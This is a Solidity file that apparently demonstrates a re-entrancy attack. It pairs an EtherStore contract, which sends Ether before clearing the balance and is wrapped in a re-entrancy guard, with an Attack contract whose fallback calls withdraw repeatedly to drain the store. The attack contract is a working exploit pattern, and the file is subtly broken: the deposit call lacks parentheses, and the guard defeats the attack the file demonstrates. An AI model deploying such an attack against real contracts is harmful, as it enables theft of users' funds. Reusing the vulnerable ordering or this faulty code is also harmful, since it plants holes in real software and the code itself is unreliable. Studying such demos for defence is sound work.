// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract ReEntrancyGuard {
    bool internal locked; 
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked =true;
        _;
        locked = false;
    }
}
contract EtherStore is ReEntrancyGuard {
    mapping (address => uint ) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noReentrant {
        uint bal = balances[msg.sender];
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent,"Falied to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance () public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherstore ;

    constructor(address _etherStoreAddress) {
        etherstore =  EtherStore(_etherStoreAddress);
    }

    fallback() external payable { 
        if(address(etherstore).balance >= 1 ether) 
        {
            etherstore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherstore.deposit{value : 1 ether};
        etherstore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
